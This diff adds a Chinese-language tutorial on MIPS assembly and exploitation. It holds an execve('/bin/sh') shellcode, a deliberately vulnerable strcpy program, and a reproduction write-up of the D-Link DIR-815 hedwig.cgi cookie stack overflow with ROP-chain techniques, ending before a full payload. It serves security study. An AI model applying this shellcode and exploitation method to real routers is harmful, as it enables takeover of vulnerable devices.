+          <td><code>sw</code></td>
+          <td>将寄存器 $rt 的值存储到内存中的地址 $t1 + offset</td>
+          <td><code>sw $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lb</code></td>
+          <td>从内存加载字节（8位）到寄存器 $rt</td>
+          <td><code>lb $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lbu</code></td>
+          <td>从内存加载无符号字节（8位）到寄存器 $rt</td>
+          <td><code>lbu $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>sb</code></td>
+          <td>将寄存器 $rt 的低8位存储到内存中的地址 $t1 + offset</td>
+          <td><code>sb $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lh</code></td>
+          <td>从内存加载半字（16位）到寄存器 $rt</td>
+          <td><code>lh $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lhu</code></td>
+          <td>从内存加载无符号半字（16位）到寄存器 $rt</td>
+          <td><code>lhu $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>sh</code></td>
+          <td>将寄存器 $rt 的低16位存储到内存中的地址 $t1 + offset</td>
+          <td><code>sh $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>lwc1</code></td>
+          <td>从内存加载单精度浮点数到浮点寄存器 $f0</td>
+          <td><code>lwc1 $f0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>swc1</code></td>
+          <td>将浮点寄存器 $f0 中的单精度浮点数存储到内存中的地址 $t1 + offset</td>
+          <td><code>swc1 $f0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>ld</code></td>
+          <td>从内存加载双字（64位）到寄存器 $rt</td>
+          <td><code>ld $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>I 型</strong></td>
+          <td><code>sd</code></td>
+          <td>将寄存器 $rt 的64位值存储到内存中的地址 $t1 + offset</td>
+          <td><code>sd $t0, 0($t1)</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>J 型</strong></td>
+          <td><code>j</code></td>
+          <td>无条件跳转，跳转到目标地址</td>
+          <td><code>j target</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>J 型</strong></td>
+          <td><code>jal</code></td>
+          <td>跳转并链接，将返回地址存储到 $ra</td>
+          <td><code>jal target</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>J 型</strong></td>
+          <td><code>jr</code></td>
+          <td>跳转到寄存器指定的地址</td>
+          <td><code>jr $ra</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>J 型</strong></td>
+          <td><code>jalr</code></td>
+          <td>跳转并链接到寄存器指定的地址，返回地址存储在 $ra</td>
+          <td><code>jalr $t0</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>特殊</strong></td>
+          <td><code>syscall</code></td>
+          <td>系统调用，执行指定的操作</td>
+          <td><code>syscall</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>特殊</strong></td>
+          <td><code>break</code></td>
+          <td>生成断点，通常用于调试</td>
+          <td><code>break</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>特殊</strong></td>
+          <td><code>eret</code></td>
+          <td>从异常中返回到用户态</td>
+          <td><code>eret</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><strong>特殊</strong></td>
+          <td><code>nop</code></td>
+          <td>无操作，通常用于填充</td>
+          <td><code>nop</code></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="函数调用约定">函数调用约定<a hidden class="anchor" aria-hidden="true" href="#函数调用约定">#</a></h3>
+<p>如果函数的参数小于等于四个，那么会使用 <code>$a0-$a3</code> 寄存器来存放参数。</p>
+<p>如果参数多于四个，那么多出来的参数会使用栈进行传参。</p>
+<p>函数 <code>A</code> 调用函数 <code>B</code>。若 <code>B</code> 是叶子函数（即 <code>B</code> 不调用其他函数），调用 <code>B</code> 时会将返回地址直接存入 <code>$ra</code> 寄存器；若 <code>B</code> 是非叶子函数（即 <code>B</code> 调用了函数 <code>C</code>），则在跳转到 <code>B</code> 时，返回地址会先存入 <code>$ra</code>，然后在 <code>B</code> 内部将 <code>$ra</code> 的值保存到栈中。</p>
+<p>当 <code>B</code> 调用 <code>C</code> 时，<code>C</code> 的返回地址会覆盖 <code>$ra</code> 的值；返回时，<code>jr $ra</code> 指令会跳回 <code>B</code> 的调用点。待 <code>B</code> 执行完毕准备返回 <code>A</code> 时，它会从栈中恢复原始的返回地址到 <code>$ra</code>，再通过 <code>jr $ra</code> 跳回 <code>A</code>。</p>
+<h3 id="系统调用">系统调用<a hidden class="anchor" aria-hidden="true" href="#系统调用">#</a></h3>
+<p>在 x86 的 Linux 系统中，功能函数是由系统调用来实现的。我们可以直接使用功能函数，也可以使用系统调用来使用相应功能。同样，在 MIPS 架构中，系统调用机制也类似，通过 <code>syscall</code> 指令触发。MIPS 的系统调用实现方式不同于 x86，但基本原理相同：通过触发中断与内核进行交互。</p>
+<ul>
+<li>系统调用号：在 MIPS 中 <code>$v0</code> 寄存器用于存放系统调用号。</li>
+<li>参数：系统调用的参数通常存储在 <code>$a0</code> 到 <code>$a3</code> 寄存器中，最多可以有 4 个参数。</li>
+<li>返回值：系统调用的返回值通常存储在 <code>$v0</code> 和 <code>v1</code> 寄存器中。</li>
+</ul>
+<blockquote>
+<p>注：在 MIPS 架构下，系统调用号可能因操作系统而异。</p>
+</blockquote>
+<p>以下是基于 Linux MIPS ABI 的一些常用系统调用及其功能：</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>系统调用号</strong></th>
+          <th><strong>名称</strong></th>
+          <th><strong>功能说明</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>4001</td>
+          <td><code>exit</code></td>
+          <td>退出程序，参数是退出状态码</td>
+      </tr>
+      <tr>
+          <td>4003</td>
+          <td><code>read</code></td>
+          <td>从文件描述符读取数据</td>
+      </tr>
+      <tr>
+          <td>4004</td>
+          <td><code>write</code></td>
+          <td>向文件描述符写入数据</td>
+      </tr>
+      <tr>
+          <td>4005</td>
+          <td><code>open</code></td>
+          <td>打开文件</td>
+      </tr>
+      <tr>
+          <td>4006</td>
+          <td><code>close</code></td>
+          <td>关闭文件描述符</td>
+      </tr>
+      <tr>
+          <td>4009</td>
+          <td><code>link</code></td>
+          <td>创建硬链接</td>
+      </tr>
+      <tr>
+          <td>4010</td>
+          <td><code>unlink</code></td>
+          <td>删除文件</td>
+      </tr>
+      <tr>
+          <td>4011</td>
+          <td><code>execve</code></td>
+          <td>执行新程序</td>
+      </tr>
+      <tr>
+          <td>4012</td>
+          <td><code>chdir</code></td>
+          <td>改变当前工作目录</td>
+      </tr>
+      <tr>
+          <td>4013</td>
+          <td><code>time</code></td>
+          <td>获取当前时间</td>
+      </tr>
+      <tr>
+          <td>4014</td>
+          <td><code>mknod</code></td>
+          <td>创建特殊文件</td>
+      </tr>
+      <tr>
+          <td>4015</td>
+          <td><code>chmod</code></td>
+          <td>修改文件权限</td>
+      </tr>
+      <tr>
+          <td>4016</td>
+          <td><code>lseek</code></td>
+          <td>文件指针定位</td>
+      </tr>
+      <tr>
+          <td>4017</td>
+          <td><code>getpid</code></td>
+          <td>获取当前进程 ID</td>
+      </tr>
+      <tr>
+          <td>4020</td>
+          <td><code>getuid</code></td>
+          <td>获取用户 ID</td>
+      </tr>
+      <tr>
+          <td>4021</td>
+          <td><code>geteuid</code></td>
+          <td>获取有效用户 ID</td>
+      </tr>
+      <tr>
+          <td>4022</td>
+          <td><code>getgid</code></td>
+          <td>获取组 ID</td>
+      </tr>
+      <tr>
+          <td>4023</td>
+          <td><code>getegid</code></td>
+          <td>获取有效组 ID</td>
+      </tr>
+      <tr>
+          <td>4024</td>
+          <td><code>ptrace</code></td>
+          <td>调试工具接口</td>
+      </tr>
+      <tr>
+          <td>4037</td>
+          <td><code>kill</code></td>
+          <td>向进程发送信号</td>
+      </tr>
+      <tr>
+          <td>4038</td>
+          <td><code>uname</code></td>
+          <td>获取系统信息</td>
+      </tr>
+      <tr>
+          <td>4040</td>
+          <td><code>mkdir</code></td>
+          <td>创建目录</td>
+      </tr>
+      <tr>
+          <td>4041</td>
+          <td><code>rmdir</code></td>
+          <td>删除目录</td>
+      </tr>
+      <tr>
+          <td>4042</td>
+          <td><code>dup</code></td>
+          <td>复制文件描述符</td>
+      </tr>
+      <tr>
+          <td>4045</td>
+          <td><code>brk</code></td>
+          <td>调整进程数据段的大小（分配堆内存）</td>
+      </tr>
+      <tr>
+          <td>4057</td>
+          <td><code>socket</code></td>
+          <td>创建套接字</td>
+      </tr>
+      <tr>
+          <td>4066</td>
+          <td><code>gettimeofday</code></td>
+          <td>获取时间和时区</td>
+      </tr>
+      <tr>
+          <td>4083</td>
+          <td><code>bind</code></td>
+          <td>绑定套接字</td>
+      </tr>
+      <tr>
+          <td>4085</td>
+          <td><code>listen</code></td>
+          <td>监听连接</td>
+      </tr>
+      <tr>
+          <td>4086</td>
+          <td><code>accept</code></td>
+          <td>接受连接</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="汇编-lab">汇编 Lab<a hidden class="anchor" aria-hidden="true" href="#汇编-lab">#</a></h3>
+<h4 id="hello-world">Hello World<a hidden class="anchor" aria-hidden="true" href="#hello-world">#</a></h4>
+<p>我们通过编写经典程序<code>Hello World</code>作为我们 MIPS 汇编 Lab 的开始。</p>
+<p>代码中<code>.section</code>用于定义段，我们用它定义了<code>.text</code>段和<code>.data</code>段。然后我们声明了一个标签<code>msg</code>，它是<code>Hello World!</code>的地址。</p>
+<p><code>.asciiz</code>用于定义一个以空字符结尾的字符串；<code>.set noreorder</code> 用于禁止指令重排序。</p>
+<p><code>.global __start</code>用于将<code>__start</code>定义为全局符号，是程序的入口点。我们通过<code>__start</code>告诉编译器，从这里开始执行代码。</p>
+<p>然后我们通过设置<code>write</code>系统调用的参数，然后触发中断输出<code>Hello World!</code>。最后通过执行 <code>exit</code> 系统调用让程序正常退出。</p>
+<pre tabindex="0"><code>.section .data
+
+msg: .asciiz &#34;Hello World!&#34;
+
+.section .text
+.set noreorder
+.global __start
+
+__start:
+
+la $a0,0
+la $a1,msg
+la $a2,13
+li $v0,4004
+syscall
+
+li $v0,4001
+syscall
+</code></pre><pre tabindex="0"><code>mips
+</code></pre><h4 id="shellcode">shellcode<a hidden class="anchor" aria-hidden="true" href="#shellcode">#</a></h4>
+<p>shellcode 即一段可以获取到 shell 的汇编代码。</p>
+<p>这里我们通过 <code>execve</code> 系统调用执行 <code>/bin/sh</code> 获取一个 shell。</p>
+<p>由于我们执行之后会直接弹出一个 shell，所以我们不需要使用 <code>exit</code> 让程序正常退出。</p>
+<pre tabindex="0"><code>.section .data
+sh: .asciiz &#34;/bin/sh&#34;
+
+.section .text
+.global __start
+
+.set noreorder
+
+__start:
+la $a0,sh
+li $a1,0
+li $a2,0
+li $v0,4011
+syscall
+</code></pre><img src="./assets/Pasted image 20241127190813.png" style="zoom:50%;" />
+<p>MIPS 在 pwn 中的特点：</p>
+<ul>
+<li>MIPS 不支持 NX 保护，所以 ret2shellcode 是最常见的利用方式</li>
+<li>溢出控制<code>$ra</code>寄存器直接跳转到 shellcode 处</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">has_stack</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">dst</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">strcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span><span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;copy successfully&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">has_stack</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>编译代码 mipsel-linux-gnu-gcc vuln.c -o vuln</p>
+<p>动态调试 qemu-mipsel -g 8888 ./vuln AAAAA</p>
+<p>IDA连接上对应的进程，即可进行动态调试</p>
+<p>![](./assets/Pasted image 20241209212922.png)</p>
+<ol start="9">
+<li>MIPS32架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈。</li>
+<li>传参过程中，前四个参数<code>a0-a3</code>，多余的会保存在调用函数的预留的栈顶空间内。</li>
+<li>MIPS 调用函数时会把函数的返回地址直接存入<code>$RA</code>寄存器。</li>
+</ol>
+<h2 id="漏洞信息">漏洞信息<a hidden class="anchor" aria-hidden="true" href="#漏洞信息">#</a></h2>
+<p>官方漏洞报告：https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625</p>
+<p>固件下载链接：https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP</p>
+<img src="./assets/image-20260204215206936.png" alt="image-20260204215206936" style="zoom:50%;" />
+<p>官方的漏洞报告中只提及了<code>DIR-645</code>型号的<code>hedwig.cgi</code>中会存在缓冲区溢出的漏洞，其实<code>D-Link</code>的<code>DIR-815/300/600/645</code>等型号都存在这个漏洞，在本篇漏洞复现报告中，笔者仅以<code>DIR-815</code>为例进行分析。</p>
+<p>笔者用于复现的物理机为<code>Ubuntu-20.04</code>，请先安装<code>qemu / binwalk / sasquatch / gdb-multiarch</code>等工具，并对<code>MIPS</code>架构下的汇编语法进行一定的了解。</p>
+<h2 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h2>
+<h3 id="固件分析">固件分析<a hidden class="anchor" aria-hidden="true" href="#固件分析">#</a></h3>
+<p>解包固件分析：</p>
+<img src="./assets/image-20260204215927789.png" alt="image-20260204215927789" style="zoom:50%;" />
+<p>先找到官方漏洞报告中所说的<code>hedwig.cgi</code>文件，<code>cd</code>到固件目录，然后通过以下命令查找到路径为<code>/squashfs-root/htdocs/web/hedwig.cgi</code>。</p>
+<pre tabindex="0"><code>find . -name &#34;hedwig.cgi&#34;
+</code></pre><p>可以看到<code>hedwig.cgi</code>是<code>cgibin</code>的软链接，所以我们需要分析的二进制文件是<code>cgibin</code>。</p>
+<p><img alt="image-20260204220238357" decoding="async" loading="lazy" src="./assets/image-20260204220238357.png" style="max-width: 100%; height: auto;"></p>
+<p>ida 逆向分析<code>cgibin</code>程序：</p>
+<img src="./assets/image-20260204220429183.png" alt="image-20260204220429183"  />
+<p>分析发现它会将<code>argv</code>获取到的参数进行多次匹配，如果匹配到相应的值则进入相应的处理逻辑。</p>
+<p>还记得我们漏洞在<code>hedwig.cgi</code>中，所以我们跟进它的处理逻辑。</p>
+<img src="./assets/image-20260204220849343.png" alt="image-20260204220849343" style="zoom:50%;" />
+<p>首先，会先取环境变量<code>REQUEST_METHOD</code>，按照判断条件必须得是<code>POST</code>请求才行。然后，会走到<code>cgibin_parse_request</code>函数。</p>
+<p>它会先对<code>url</code>进行解析，然后将<code>POST</code>的内容读入进来，再通过<code>sub_409A6C</code>函数进行解析。</p>
+ <img src="./assets/image-20260204230427091.png" alt="image-20260204230427091" style="zoom:50%;" />
+<p>在<code>cgibin_parse_request</code>函数内：</p>
+<p>这里会获取圈出的几个环境变量，不过和后面的栈溢出漏洞关系都不大，但是不能没有，需要随便输入一点东西，具体原因之后会分析。</p>
+<ul>
+<li>CONTENT_TYPE</li>
+<li>CONTENT_LENGTH</li>
+<li>REQUEST_URI</li>
+</ul>
+<img src="./assets/image-20260204230645842.png" alt="image-20260204230645842" style="zoom:50%;" />
+<p>继续走到<code>sess_get_uid</code>函数：</p>
+<img src="./assets/image-20260204230903586.png" alt="image-20260204230903586" style="zoom:67%;" />
+<p><code>sess_get_uid</code>函数中有对<code>HTTP_COOKIE</code>环境变量的获取：</p>
+<img src="./assets/image-20260204231009893.png" alt="image-20260204231009893" style="zoom:50%;" />
+<p>对<code>HTTP_COOKIE</code>中<code>=</code>的前后进行了分离：</p>
+<img src="./assets/image-20260204231052418.png" alt="image-20260204231052418" style="zoom:50%;" />
+<p>可以看见，<code>=</code>前面的内容被存入了<code>v2</code>，后面的内容被存入了<code>v4</code>，最后会对<code>v2</code>中的内容进行一个判断：</p>
+<img src="./assets/image-20260308114328516.png" alt="image-20260308114328516" style="zoom:50%;" />
+<p>总体来说就是判断等号前的内容是否为<code>uid</code>，判断通过了以后，就会将等号后面的字符串拼接入<code>a1</code>，也就是主函数传进来的参数<code>v4</code>。</p>
+<p>再然后，就到了一个可能发生栈溢出的漏洞点：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_5FETSMNHCBN9M5E.png" style="max-width: 100%; height: auto;"></p>
+<p>这里的<code>string</code>就是<code>v4</code>中的字符串，也<strong>就是<code>cookie</code>中<code>uid=</code>之后的内容</strong>，是可以由用户自由控制的，然而<code>v27</code>数组的大小仅有<code>1024</code>，因此，很容易造成缓冲区溢出。</p>
+<p>我们发现，在之后还有一个类似的<code>sprintf</code>：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_G46ZUFGH7PQ8GXK.png" style="max-width: 100%; height: auto;"></p>
+<p>这里的<code>string</code>仍然是<code>v4</code>，进一步观察，<strong>发现<code>v4</code>在两个<code>sprintf</code>之间未被改变过</strong>，也就是说，这里的<code>string</code>仍然是<code>cookie</code>中<code>uid=</code>后面的字符串，如果能走到这第二个<code>sprintf</code>的话，那么这里才是真正的溢出漏洞点，因为仍然是<code>v27</code>数组的溢出，两次拼接的字符串又一样，所以这里能覆盖上一次<code>sprintf</code>的内容。</p>
+<p>容易看出，如果能走到第二个<code>sprintf</code>的话，就需要过这两个判断：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_F64BBPUB3CMVYQF.png" style="max-width: 100%; height: auto;"></p>
+<p>这第一个判断需要有<code>/var/tmp</code>这个目录，这个<strong>在真机上是有的</strong>，因此为了更真实地模拟环境，我们需要在解压后得到的文件系统内创建一个<code>/var/tmp</code>文件夹，这样<code>cgibin</code>才能在此路径下创建<code>temp.xml</code>文件用于数据的写入。</p>
+<p>第二个判断<code>haystack</code>的值在这之前只有<code>cgibin_parse_request</code>的第一个参数<code>sub_409A6C</code>中可对其操作：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_R4J4JB5W53KVHRK.png" style="max-width: 100%; height: auto;"></p>
+<p>这个<code>sub_409A6C</code>函数<strong>需要<code>POST</code>传入内容</strong>的时候才能走到，那么要使得<code>POST</code>传入内容，也就要走到<code>cgibin_parse_request</code>中的这里：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_XM69Z4K66GZXMV9.png" style="max-width: 100%; height: auto;"></p>
+<p>这里跳转到的<code>sub_403B10</code>函数后，才有对<code>POST</code>内容的读入，并调用到<code>sub_409A6C</code>：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_TEA8ZRZJXACTGTW.png" style="max-width: 100%; height: auto;"></p>
+<p>上图是进入<code>sub_403B10</code>函数后，最终走到的<code>sub_402B40</code>函数，其中这里的<code>v9</code>函数指针就是指向的<code>sub_409A6C</code>函数。</p>
+<p>再回到<code>cgibin_parse_request</code>函数中，要走到读入<code>POST</code>内容的那里，就必须要使得<code>v9!=-1</code>才行，再往<code>cgibin_parse_request</code>函数上面看看：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_EETYZCR4PJ2CR9F.png" style="max-width: 100%; height: auto;"></p>
+<p>因此，环境变量<code>REQUEST_URI</code>中也必须有内容才行，这里环境变量<code>CONTENT_TYPE</code>仍然是老规矩<code>application/x-www-form-urlencoded</code>，不再多分析了。</p>
+<p>满足了以上条件，就能顺利地走到第二个<code>sprintf</code>了，也就是真机环境中真正的栈溢出漏洞点。</p>
+<h3 id="构造rop链">构造ROP链<a hidden class="anchor" aria-hidden="true" href="#构造rop链">#</a></h3>
+<p>下载链接：<a href="https://pan.baidu.com/s/1Gd7uxLVRTxwAxRseJFrf_w?pwd=xidp">mipsrop附件.rar_免费高速下载|百度网盘-分享无限制</a></p>
+<pre tabindex="0"><code>&gt;import mipsrop
+&gt;mipsrop=mipsrop.MIPSROPFinder()
+&gt;mipsrop.find(&#34;&#34;)
+</code></pre><p>寻找<code>IDA</code>的<code>gadget</code>最好还是用<code>IDA</code>的插件<code>mipsrop</code>，里面的<code>stackfinder()/tail()/system()</code>等选项很便于寻找一些<code>gadget</code>，也可以使用如<code>mipsrop.find(&quot;li .*, 1&quot;)</code>的形式，通过<code>.*</code>进行模糊匹配：</p>
+<p><code>MIPS</code>架构下的栈溢出肯定也是需要通过构造<code>ROP</code>链来<code>getshell</code>的，不过由于<code>MIPS</code>有个特性，即无法开<code>NX</code>保护，这样就有了两种构造<code>ROP</code>链的方式：第一种就是纯<code>ROP</code>链，通过调用<code>system</code>函数来<code>getshell</code>；第二种就是通过构造<code>ROP</code>链，跳转至读入到栈/<code>bss</code>段等处的<code>shellcode</code>执行。在实际应用中，最常用的还是通过<code>ROP + shellcode</code>的方式来<code>getshell</code>。</p>
+<p>下面主要来介绍一些常见的<code>MIPS</code>架构的特性（<code>32</code>位<code>mipsel</code>）。</p>
+<h4 id="叶子函数与非叶子函数">叶子函数与非叶子函数<a hidden class="anchor" aria-hidden="true" href="#叶子函数与非叶子函数">#</a></h4>
+<p>叶子函数指的是<strong>没有调用任何子函数的函数</strong>，其返回地址会存放在<code>$ra</code>寄存器中，在该函数结束时，<strong>直接就通过<code>$ra</code>寄存器跳转返回</strong>。</p>
+<p>非叶子函数自然就是指<strong>其中调用了其他子函数的函数</strong>，其返回地址<code>$ra</code>会在程序开始（<code>prologue</code>）<strong>通过<code>sw</code>指令存放在栈上</strong>，因为其中调用了其他子函数，肯定会需要改变<code>$ra</code>寄存器的值，来作为其他子函数的返回地址，所以最先的数据需要保存下来，然后在该函数结束（<code>epilogue</code>）时，再<strong>对应地通过<code>lw</code>指令取出</strong>，并跳转返回。</p>
+<p>同样的道理，如果在某个函数中使用到了 <strong><code>$s0 ~ $s7</code>中的某些保存寄存器（包括<code>$fp</code>）</strong> ，则也会在<code>prologue</code>处保存下来，并在<code>epilogue</code>处取出。</p>
+<p>需要注意的是，<code>$s0 ~ $s7, $fp, $sp</code>在栈中存放的地址<strong>依次递增</strong>，因此，很容易想到，我们可以在栈溢出的同时，顺带着<strong>控制到<code>$s0 ~ $s7</code>的值</strong>。</p>
+<p><code>MIPS</code>的这个特性是一个在栈溢出中很好利用的点，若是二进制文件中没有或没有完整的<code>prologue/epilogue</code>段，<strong>在<code>libc</code>的<code>scandir/scandir64</code>中</strong>可以找到完整的汇编段，来控制这所有的寄存器：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_AZBH6EKV6C3GM44.png" style="max-width: 100%; height: auto;"></p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_BMNRH4FAFT4JBSN.png" style="max-width: 100%; height: auto;"></p>
+<p>最后，都会通过<code>addiu $sp, ...</code>的命令，将栈抬高到<code>$ra</code>后面的位置。</p>
+<h4 id="流水线指令集相关特性">流水线指令集相关特性<a hidden class="anchor" aria-hidden="true" href="#流水线指令集相关特性">#</a></h4>
+<p><code>MIPS</code>架构存在“流水线效应”，简单来说，就是本应该顺序执行的几条命令却同时执行了，其还存在缓存不一致性（<code>cache incoherency</code>）的问题。</p>
+<p>首先举例说说 <strong>“流水线效应”</strong> ，最常见的就是跳转指令（如<code>jalr</code>）导致的<strong>分支延迟效应</strong>，任何一个分支跳转语句后面的那条语句叫做<strong>分支延迟槽</strong>，当它跳转指令填充好跳转地址，还没来得及跳转过去的时候，跳转指令的下一条指令（分支延迟槽）就已经执行了，可以认为是<strong>它会先执行跳转指令的后一条指令，然后再跳转</strong>。</p>
+<p>再来说说 <strong>“缓存不一致性”</strong> 的问题，指的是：指令缓存区（<code>Instruction Cache</code>）和数据缓存区（<code>Data Cache</code>）两者的同步需要一个时间来同步，常见的就是，比如我们将<code>shellcode</code>写入栈上，此时这块区域还属于数据缓存区，如果我们此时像<code>x86_64</code>架构一样，直接跳转过去执行，就会出现问题，因此，我们<strong>需要调用<code>sleep</code>函数</strong>，先停顿一段时间，给它时间从数据缓存区转成指令缓存区，然后再跳转过去，才能成功执行。当然，有时候可能直接跳转过去也不会出错，这原因就比较多了，可能是由于两个缓冲区已经有足够时间同步，也有可能是和硬件层面有关的一些原因所导致的，但是保险来说，还是最好<code>sleep</code>一下。</p>
+<h4 id="跳转到某个函数的rop链构造技巧">跳转到某个函数的ROP链构造技巧<a hidden class="anchor" aria-hidden="true" href="#跳转到某个函数的rop链构造技巧">#</a></h4>
+<p>我们先来观察<code>MIPS</code>架构下某一个函数的开头部分，比如<code>system</code>函数最开始的这两行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">li</span>      <span class="err">$</span><span class="n">gp</span><span class="p">,</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mh">0x7FF0</span> <span class="o">-</span> <span class="p">.)</span>  <span class="err">#</span> <span class="n">Alternative</span> <span class="n">name</span> <span class="n">is</span> <span class="err">&#39;</span><span class="n">__libc_system</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">addu</span>    <span class="err">$</span><span class="n">gp</span><span class="p">,</span> <span class="err">$</span><span class="n">t9</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">`</span>
+</span></span></code></pre></div><p>这里全局寄存器<code>$gp</code>从取了个偏移值（这个偏移值是相对于该函数地址的）之后，又与<code>$t9</code>寄存器相加，此时的 <strong><code>$t9</code>寄存器要求是该函数的首地址</strong> 才行，也就是说，我们跳转到某个函数的时候，一定要通过<code>jalr $t9</code>类似的<code>gadget</code>进行跳转才行。</p>
+<p>再来观察这个函数（<code>system</code>函数）的最后两行：</p>
+<pre tabindex="0"><code>...
+jr      $ra
+addiu   $sp, 0x48
+</code></pre><p>我们发现，最后的返回的时候，得是<strong>通过<code>$ra</code>寄存器中的地址跳转</strong>的，也就是说，我们在跳转到这个函数之前，就也得控制好<code>$ra</code>寄存器中的地址为我们跳转后执行完该函数，再下一个跳转到的地方。很方便的是，我们发现<code>move $t9, ...</code>这样的<code>gadget</code>之后，通常会有<code>lw $ra, ...</code>这样的<code>gadget</code>，最后再<code>jr $t9</code>，这类<code>gadget</code><strong>可以通过<code>mipsrop.tail()</code>来进行查找</strong>：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_3BQGXV8C88CRVBG.png" style="max-width: 100%; height: auto;"></p>
+<p>通过这类<code>gadget</code>，就可以比较完美地实现跳转到某个函数的ROP链的构造。</p>
+<h4 id="跳转到shellcode的rop链构造技巧">跳转到shellcode的ROP链构造技巧<a hidden class="anchor" aria-hidden="true" href="#跳转到shellcode的rop链构造技巧">#</a></h4>
